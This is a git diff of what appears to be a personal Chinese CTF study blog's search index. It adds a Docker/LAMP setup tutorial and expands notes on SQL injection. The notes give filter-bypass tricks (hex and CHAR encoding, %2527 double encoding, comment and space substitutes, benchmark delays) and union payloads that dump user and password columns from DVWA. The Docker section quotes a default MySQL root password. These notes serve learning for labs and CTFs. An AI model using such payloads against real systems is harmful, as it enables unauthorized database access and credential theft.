@@ -3,6 +3,92 @@
   
     
     <entry>
+      <title><![CDATA[Docker使用]]></title>
+      <url>/2018/04/21/docker/</url>
+      <content type="html"><![CDATA[<p>— docker安装使用 —<br>— docker下LAMP搭建 —<br>— linoda/lamp使用 —<br><a id="more"></a><br>出题需要….入坑….翻滚….翻滚…..坑中来回翻滚…</p>
+<h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p><a href="https://blog.csdn.net/u013814153/article/details/53925790" target="_blank" rel="external">kali下安装docker</a><br><a href="https://docs.docker-cn.com" target="_blank" rel="external">官方文档</a>(需要翻墙)</p>
+<h2 id="Docker层次"><a href="#Docker层次" class="headerlink" title="Docker层次"></a>Docker层次</h2><p>仓库（Repository）—— 镜像（Image）—— 容器（Container）<br>仓库在云端，有官方有个人的很多很多镜像<br>镜像运行成为容器<br>先弄一个自己的仓库吧，可以传上去传下来<br>申请一个Docker账号，就可以有自己的仓库（虽然事后证明，因为网速问题，并不可以传上去传下来）</p>
+<h2 id="Docker账号与代理"><a href="#Docker账号与代理" class="headerlink" title="Docker账号与代理"></a>Docker账号与代理</h2><p><a href="https://cloud.docker.com/" target="_blank" rel="external">申请docker账号</a>(不翻墙很慢)<br><a href="https://www.cnblogs.com/anliven/p/6218741.html" target="_blank" rel="external">代理加速</a>(文章其中的docker login的账号密码应该docker的账号和密码)</p>
+<h2 id="Docker-仓库-操作"><a href="#Docker-仓库-操作" class="headerlink" title="Docker 仓库 操作"></a>Docker 仓库 操作</h2><p><code>Docker login</code>：登录个人Docker<br><code>Docker logout</code>：退出个人Docker<br><code>Docker search XXXX</code>：从官方仓库个人仓库，搜索类似的镜像 比如Docker search ubuntu</p>
+<h2 id="Docker-文件-lt-–-gt-镜像-lt-–-gt-仓库"><a href="#Docker-文件-lt-–-gt-镜像-lt-–-gt-仓库" class="headerlink" title="Docker 文件&lt;–&gt;镜像&lt;–&gt;仓库"></a>Docker 文件&lt;–&gt;镜像&lt;–&gt;仓库</h2><p><code>docker push [用户/仓库：标签]</code>：推送一个镜像到个人仓库<br><code>docker pull [用户/仓库：标签]</code>：从仓库拉取一个镜像到本地<br><code>docker save -o 文件 镜像</code>：镜像输出到文件<br><code>docker load -i 文件</code>：文件读取成镜像</p>
+<h2 id="通过-Dockerfile-新建Docker镜像"><a href="#通过-Dockerfile-新建Docker镜像" class="headerlink" title="通过 Dockerfile 新建Docker镜像"></a>通过 Dockerfile 新建Docker镜像</h2><p>在拥有Dockerfile的文件夹下运行<br><code>docker build [options] PATH/URL</code></p>
+<ul>
+<li>-t images_name:指定镜像名字</li>
+<li>-f:指定Dockerfile文件，如果没有，默认在上下文中</li>
+<li>PATH/URL：指定本地上下文路径，或远程Dockerfile<br>关于Dockerfile的语法，在本文最后总结，这个比较难</li>
+</ul>
+<h2 id="Docker镜像-操作"><a href="#Docker镜像-操作" class="headerlink" title="Docker镜像 操作"></a>Docker镜像 操作</h2><p><code>docker images</code>：查看本地镜像<br><code>docker rmi &lt;image_name&gt;</code>:删除本地镜像</p>
+<h2 id="docker镜像-–-gt-容器"><a href="#docker镜像-–-gt-容器" class="headerlink" title="docker镜像 –&gt; 容器"></a>docker镜像 –&gt; 容器</h2><p><code>docker run 镜像ID / 仓库名：标签名</code>:通过本地镜像生成容器<br>参数：</p>
+<ul>
+<li>-i:以交互模式运行容器</li>
+<li>-d:容器在后台运行</li>
+<li>-t:启动后进入命令行</li>
+<li>-p:端口映射</li>
+<li>-v：挂载文件，可以在外面操作里面的文件</li>
+</ul>
+<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>端口映射：使用<code>-p</code>参数会分配宿主机的端口映射到虚拟机<br><code>docker run -p ip:hostPort:containerPort</code><br>ip：宿主机的ip地址<br>hostPort：宿主机需要映射的端口<br>containerPort：虚拟机的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -p 127.0.0.1:3306:3306，映射本机的3306端口到虚拟机的3306端口。</div></pre></td></tr></table></figure>
+<h3 id="检查端口"><a href="#检查端口" class="headerlink" title="检查端口"></a>检查端口</h3><p><code>docker port cortainerid</code>：查看容器端口映射情况</p>
+<h2 id="Docker-容器文件-lt-–-gt-容器–-gt-镜像-仓库"><a href="#Docker-容器文件-lt-–-gt-容器–-gt-镜像-仓库" class="headerlink" title="Docker 容器文件&lt;–&gt;容器–&gt;镜像/仓库"></a>Docker 容器文件&lt;–&gt;容器–&gt;镜像/仓库</h2><p><code>docker commit [参数] 容器ID [用户/仓库：标签]</code>：把容器固化成镜像<br>参数：</p>
+<ul>
+<li>-m 说明 </li>
+<li>-a 作者信息<br><code>docker import -m &quot;message&quot; file|URL 名称</code>：从文件读入<br><code>docker export -m &quot;message&quot; file|URL 名称</code>：读出到文件</li>
+</ul>
+<h2 id="Docker容器-操作"><a href="#Docker容器-操作" class="headerlink" title="Docker容器 操作"></a>Docker容器 操作</h2><p><code>docker ps</code>:查看运行中的container</p>
+<ul>
+<li>-a：查看所有容器包括停止状态的容器</li>
+</ul>
+<p><code>docker start CONTAINER ID</code><br><code>docker stop CONTAINER ID</code><br><code>docker restart CONTAINER ID</code><br><code>ctrl + p then ctrl + q</code>:挂起正在运行中的容器的命令行<br><code>docker attach CONTAINER ID</code>:链接正在运行的挂起容器<br><code>docker rm &lt;CONTAINER_ID/CONTAINER_NAME&gt;</code>:删除容器<br>ps.CONTAINER ID:容器ID，可以缩写，即前几位</p>
+<h2 id="Docker容器-lt-–-gt-本机-传输文件"><a href="#Docker容器-lt-–-gt-本机-传输文件" class="headerlink" title="Docker容器 &lt;–&gt; 本机 传输文件"></a>Docker容器 &lt;–&gt; 本机 传输文件</h2><p><code>docker cp 本地文件路径 ID全称:容器路径</code><br><code>docker cp ID全称:容器文件路径 本地路径</code></p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqjgynt734j30sg0lcdi0.jpg" alt="docker"></p>
+<h2 id="Dockerfile-命令"><a href="#Dockerfile-命令" class="headerlink" title="Dockerfile 命令"></a>Dockerfile 命令</h2><p><strong>FROM 指定基础镜像</strong><br>格式：<code>FROM &lt;image&gt;/&lt;image&gt;:&lt;tag&gt;</code></p>
+<p><strong>MAINTAINER 指定维护者信息</strong><br>格式：<code>MAINTAINER image_creator@docker.com</code><br>该信息会写入生成镜像的Author属性域中</p>
+<p><strong>WORKDIR 指定容器工作目录</strong><br>格式：<code>WORKDIR /path</code></p>
+<p><strong>COPY 复制文件</strong><br>格式：<code>COPY &lt;源路径&gt; &lt;目标路径&gt;</code></p>
+<ul>
+<li>源路径：在上下文目录中，为上下文根目录的相对路径</li>
+<li>目标路径：可以是容器内绝对路径，也可以是相对于工作目录的相对路径</li>
+</ul>
+<p><strong>ADD 高级复制文件</strong><br>格式：<code>ADD &lt;源路径&gt; &lt;目标路径&gt;</code></p>
+<ul>
+<li>源路径：可以是URL，会先下载这个URL指向的文件到目标路径去取；如果是tar压缩文件，会自动解压</li>
+</ul>
+<p><strong>RUN 运行指定命令</strong><br>格式：<code>RUN &lt;command&gt; / RUN [&#39;executable&#39;,&quot;param1&quot;,&quot;param2&quot;]</code></p>
+<ul>
+<li>前者在shell中断中执行命令，即 /bin/sh -c</li>
+<li>后者使用exec执行</li>
+</ul>
+<p>每条RUN指令将在当前镜像的基础上执行指定命令并提交为新的镜像。<br>可以命令较长，可以使用\换行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RUN apt-get update</div></pre></td></tr></table></figure></p>
+<p><strong>CMD 指定启动容器时默认执行的命令</strong></p>
+<ul>
+<li>CMD [“executable”,”param1”,”param2”] 使用exec执行，是推荐使用的方式</li>
+<li>CMD param1 param2 在/bin/sh中执行，提供给需要交互的应用；</li>
+<li>CMD [“param1”,”param2”] 提供给ENTRYPOINT的默认参数。</li>
+</ul>
+<p>每个Dockerfile只能有一条CMD命令。如果指定了多条命令，只有最后一条会被执行。</p>
+<p><strong>EXPOSE 声明端口监听</strong><br>格式：<code>EXPOSE &lt;POST&gt;</code><br>只起到声明的作用，不会自动完成端口映射。还是需要docker run -p来指定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXPOSE 22 80 443 3306 ##这些端口需要监听，即映射到外部</div></pre></td></tr></table></figure></p>
+<p><a href="https://www.cnblogs.com/fengzheng/p/5181222.html" target="_blank" rel="external">其他Dockerfile命令</a></p>
+<h2 id="DOCKER下-LAMP-搭建"><a href="#DOCKER下-LAMP-搭建" class="headerlink" title="DOCKER下 LAMP 搭建"></a>DOCKER下 LAMP 搭建</h2><p>利用了官方ubuntu<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line">apt-get install vim-gtk</div><div class="line">apt-get install net-tools</div><div class="line"><span class="comment">#可以更新源</span></div><div class="line">apt-get install mysql-server</div><div class="line">service mysql start</div><div class="line">apt-get install apache2</div><div class="line">service apache2 start</div><div class="line">apt-get install php7.0 php7.0-mcrypt</div><div class="line"></div><div class="line">vim /etc/apache2/sites-available <span class="comment"># 修改网站根目录</span></div></pre></td></tr></table></figure></p>
+<p>发现装错了。。。应该php5.5<br>删除php7 更换php5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#移除默认已安装的PHP包</span></div><div class="line">apt-get install aptitude</div><div class="line">aptitude purge `dpkg -l | grep php| awk <span class="string">'&#123;print $2&#125;'</span> |tr <span class="string">"\n"</span> <span class="string">" "</span>`</div><div class="line"><span class="comment">#安装切换源的add-apt-repository所依赖的两个包</span></div><div class="line">apt-get install python-software-properties</div><div class="line">apt-get install software-properties-common</div><div class="line">apt-get update</div><div class="line"><span class="comment">##更新得到PPA源</span></div><div class="line">add-apt-repository ppa:ondrej/phpe</div><div class="line"><span class="comment">##出错WARNING: could not open file '/etc/apt/sources.list'</span></div><div class="line">之前改过sources.list</div><div class="line">把原来的sources.list 替换回去 就可以</div><div class="line"><span class="comment">##出错WARNING: add-apt-repository is broken with non-UTF-8 locales</span></div><div class="line">根据提示内容修改命令</div><div class="line">LC_ALL=C.UTF-8 add-apt-repository ppa:ondrej/php</div><div class="line">apt-get update</div><div class="line"><span class="comment">##安装php对应版本</span></div><div class="line">apt-get install php5.6</div><div class="line">apt-get install php5.6-gd</div><div class="line">apt-get install php5.6-mysql</div></pre></td></tr></table></figure></p>
+<p>…..好了 下载速度贼慢，疯狂断<br>再换…</p>
+<h2 id="docker下利用linoda-lamp"><a href="#docker下利用linoda-lamp" class="headerlink" title="docker下利用linoda/lamp"></a>docker下利用linoda/lamp</h2><p><a href="https://hub.docker.com/r/linode/lamp/" target="_blank" rel="external">官方文档</a><br><a href="https://blog.csdn.net/MasonQAQ/article/details/78048112?locationNum=5&amp;fps=1" target="_blank" rel="external">网上教程</a></p>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>service mysql start</code><br><code>mysql -u root -p</code><br><code>Admin2015</code></p>
+<h3 id="apache2-配置文件"><a href="#apache2-配置文件" class="headerlink" title="apache2 配置文件"></a>apache2 配置文件</h3><p><code>/etc/apache2/apache2.conf</code>:apache2启动时自动读取文件<br><code>/etc/apache2/sites-enabled</code>：指向sites-available文件的符号链接<br><code>/etc/apache2/sites-available</code>：真正配置文件所在</p>
+<p>如果apache上配置了多个虚拟主机，每个虚拟主机的配置文件都放在 sites-available下，那么对于虚拟主机的停用、启用就非常方便了。<br>当在sites-enabled下建立一个指向某个虚拟主机配置文件的链 接时，就启用了它；如果要关闭某个虚拟主机的话，只需删除相应的链接即可，根本不用去改配置文件。</p>
+<p>删除/etc/apache2/sites-enabled下的文件<br>删除/etc/apache2/sites-available下的example什么的，修改000什么的修改网站根目录<br>restart</p>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p><code>php -v</code> 查看版本<br><code>php -m</code> 查看扩展<br>发现pdo-mysql扩展没有<br>网上一堆说重新编译，但是重新编译需要知道php安装路径，mysql安装路径，phpize一些东西，还需要下源码等<br>在别人的docker里，让人想死<br>其实<br>通过<code>apt-get install php5-mysql</code>安装即可<br><code>service apache2 restart</code></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[WEB-SQL报错注入]]></title>
       <url>/2018/04/09/WEB-SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
       <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>— Mysql报错注入 —<br><a id="more"></a></p>
@@ -1119,7 +1205,9 @@ Content-Type: text/xml
 <hr>
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
 <li>url base64 utf-8… (全部编码或个别编码)</li>
-<li>字符–&gt;char()  如：Test  –&gt; CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</li>
+<li>字符–&gt;char()<br><code>SELECT FROM Users WHERE username = CHAR(101,97,115,116)</code></li>
+<li>hex<br><code>SELECT password FROM Users WHERE username = 0x61646D696E</code></li>
+<li>%2527 -&gt; %27 -&gt; ‘ (绕过magic_quotes_gpc对于’的加/过滤，特定情况可以用吧)</li>
 </ul>
 <h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><p>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin</p>
 <h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3><p>SeLeT   不多解释</p>
@@ -1128,14 +1216,20 @@ Content-Type: text/xml
 <li>用注释符号代替空格 /**/</li>
 <li>用括号代替空格 </li>
 <li>用+代替空格  </li>
-</ul>
+<li><p>%0a %a0 %20</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="number">2</span>;   <span class="comment">---------&gt;   select(user())from dual where(1=1)and(2=2)</span></div><div class="line">利用函数完成猜解  如：  猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟</div><div class="line">	http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109))</div></pre></td></tr></table></figure>
-<ul>
-<li>select+user()  +代替空格  不是url编码空格的+而是直接的+<h3 id="过滤information-schema"><a href="#过滤information-schema" class="headerlink" title="过滤information_schema"></a>过滤information_schema</h3><code>select table_name from mysql.innodb_table</code></li>
+</li>
+<li><p>select+user()  +代替空格  不是url编码空格的+而是直接的+</p>
+<h3 id="过滤information-schema-tables等关键表名"><a href="#过滤information-schema-tables等关键表名" class="headerlink" title="过滤information_schema.tables等关键表名"></a>过滤information_schema.tables等关键表名</h3></li>
+<li><code>select table_name from mysql.innodb_table</code> 不清楚何时起作用，起码我的mysql中没有innodb_table这个表</li>
+<li>information_schema . tables<br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqgxvtxg2nj30aq02r3yd.jpg" alt=""></li>
+<li>/<em>!50000information_schema.tables</em>/</li>
+<li>尝试其他也包含库表信息的表<code>information_schema.key_column_usage/partitions/statistics/table_constraints</code></li>
 </ul>
 <h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><ul>
 <li>=用<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="external">like</a>代替</li>
 <li>需要与零比较：<code>-1 or 1=1 and ord(substr(user(),1,1))-114</code></li>
+<li>substring(flag,1,1)in(‘a’) / substring(flag,1,1)in(0x97)</li>
 </ul>
 <h3 id="Mysql条件注释的利用-…"><a href="#Mysql条件注释的利用-…" class="headerlink" title="Mysql条件注释的利用  /! … /"></a>Mysql条件注释的利用  /<em>! … </em>/</h3><ul>
 <li><strong>/<em>! … </em>/</strong>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
@@ -1148,7 +1242,7 @@ Content-Type: text/xml
 </ul>
 <h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用十六进制可以绕过引号<br>如：”users” —&gt; 0x7573657273</p>
 <h3 id="过滤-lt-与-gt"><a href="#过滤-lt-与-gt" class="headerlink" title="过滤&lt;与&gt;"></a>过滤&lt;与&gt;</h3><p>使用<a href="http://www.yiibai.com/sql/sql_function_greatest.html" target="_blank" rel="external">GREATEST()</a>绕过比较操作符。<br><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code> ——-&gt;<br><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p>
-<h3 id="过滤sleep"><a href="#过滤sleep" class="headerlink" title="过滤sleep"></a>过滤sleep</h3><p><a href="http://blog.sina.com.cn/s/blog_778e18e90101a48h.html" target="_blank" rel="external">benchmark(x, y)</a><br>benchmark(1000,sha(1)) 1000次sha(1)，来时间延迟  </p>
+<h3 id="过滤sleep"><a href="#过滤sleep" class="headerlink" title="过滤sleep"></a>过滤sleep</h3><p><a href="http://blog.sina.com.cn/s/blog_778e18e90101a48h.html" target="_blank" rel="external">benchmark(x, y)</a><br>benchmark(10000000,sha(1)) 1000次sha(1)，来时间延迟  </p>
 <h3 id="sleep中不能使用数字"><a href="#sleep中不能使用数字" class="headerlink" title="sleep中不能使用数字"></a>sleep中不能使用数字</h3><p>用pi()函数绕过<br><code>sleep(ceil(pi()))</code></p>
 <h3 id="过滤注释符号（-，–）"><a href="#过滤注释符号（-，–）" class="headerlink" title="过滤注释符号（#，–）"></a>过滤注释符号（#，–）</h3><ul>
 <li>id=1’ union select 1,2,3||’1</li>
@@ -1467,8 +1561,12 @@ Content-Type: text/xml
 <p>假设得到 2 ，以后想要查询的信息就放在第二个列处</p>
 <h3 id="4-利用函数来收集信息"><a href="#4-利用函数来收集信息" class="headerlink" title="4.利用函数来收集信息"></a>4.利用函数来收集信息</h3><p>查询sql自带的函数来确定当前用户，当前数据库等信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">用户：user()</div><div class="line">当前数据库：database()</div><div class="line">数据库版本：version()</div><div class="line">@@hostname （用户）</div><div class="line">@@datadir   (数据库在文件的位置)</div><div class="line">@@version  （版本)</div><div class="line">@@version_compile_OS  (操作系统版本)</div><div class="line"></div><div class="line">$name=' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>() <span class="comment">--+</span></div><div class="line"></div><div class="line">全局：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>() <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
 <p>如果为root用户，就可以访问information_schema数据库</p>
+<blockquote>
+<p>n个月后，当我在配置mysql比赛环境的时候，第一次用到了除了ROOT用户以外的其他用户。<br>创建了一个新的用户，修改了它的权限。发现它竟然也可以直接访问information_schema表<br>三观崩坏的同时，去查了一波资料<br>mysql每个用户都可以访问information_schema，且没法设置不能访问，但是不用担心权限问题，因为information_schema里面的内容会根据用户权限而变化。即该用户只能从information_schema里面查询到自己有权限查看的库和表等<br>同时因为CTF题目而产生的美丽的误会，大致是因为题目单独对于information_schema进行了过滤，才访问不到的</p>
+</blockquote>
+<p>所以，不要因为不是root账户，就不去尝试这个最省事的办法！<br>都需要先尝试访问information_schema!</p>
 <h3 id="5-通过-union-查询数据库"><a href="#5-通过-union-查询数据库" class="headerlink" title="5.通过 union 查询数据库"></a>5.通过 union 查询数据库</h3><p>  通过<strong>information_schema数据库</strong>中的tables，columns来查询目标的数据库，表，列<br>  再直接查询内容<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">查询数据库</div><div class="line">$name=' union <span class="keyword">select</span> <span class="number">1</span>,table_schema <span class="keyword">from</span> information_schema.tables <span class="comment">--+</span></div><div class="line"></div><div class="line">查询数据库中有多少个表</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select table_schema,count(*) from information_schema.tables --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库中的表名</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'dvwa'</span> <span class="comment">--+</span></div><div class="line"></div><div class="line">查询指定数据库指定表中的列名</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select table_name,column_name from information_schema.columns where table_schema='</span>dvwa<span class="string">' and table_name='</span><span class="keyword">users</span><span class="string">'--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库指定表的列的内容</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> dvwa.users <span class="comment">--+</span></div><div class="line"></div><div class="line">查询链接显示</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select null,concat_ws('</span> : <span class="string">',user,password) from dvwa.users --(空格)</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="string">' : '</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users <span class="comment">--(空格)</span></div><div class="line">ps. <span class="string">':'</span> 编码<span class="comment">---&gt; 0x3a</span></div></pre></td></tr></table></figure></p>
-<h3 id="6-无权限时，猜解列名，表名，库名"><a href="#6-无权限时，猜解列名，表名，库名" class="headerlink" title="6.无权限时，猜解列名，表名，库名"></a>6.无权限时，猜解列名，表名，库名</h3><p>  当前用户不是root用户，就无权访问information_schema库<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line">$name=' and column is null <span class="comment">--+    </span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">and</span> <span class="keyword">column</span> <span class="keyword">is</span> <span class="literal">null</span> <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
+<h3 id="6-无法访问时，猜解列名，表名，库名"><a href="#6-无法访问时，猜解列名，表名，库名" class="headerlink" title="6.无法访问时，猜解列名，表名，库名"></a>6.无法访问时，猜解列名，表名，库名</h3><p>  当无法访问information_schema库时<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line">$name=' and column is null <span class="comment">--+    </span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">and</span> <span class="keyword">column</span> <span class="keyword">is</span> <span class="literal">null</span> <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
 <p>用字典文件替换column，如果不存在此列，有错误；存在此列，无返回(类似来判断，下同)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2.猜解当前表名<span class="comment">------已猜出列名</span></div><div class="line">$name=' and table.user is null <span class="comment">--+	</span></div><div class="line"></div><div class="line">3.猜解当前数据库名<span class="comment">--已猜出列名，表名</span></div><div class="line">$name=' and db.table.user is null <span class="comment">--+</span></div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line">$name=' and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">table</span>)&gt;<span class="number">0</span> <span class="comment">--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div></pre></td></tr></table></figure></p>
 <p>在猜解到你所要的库，表，列之后可以直接union select 查询</p>
 <h2 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h2><p>数字型注入和字符型注入原理相同，但更为简单。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$name=1 and 1=1 #</div></pre></td></tr></table></figure></p>
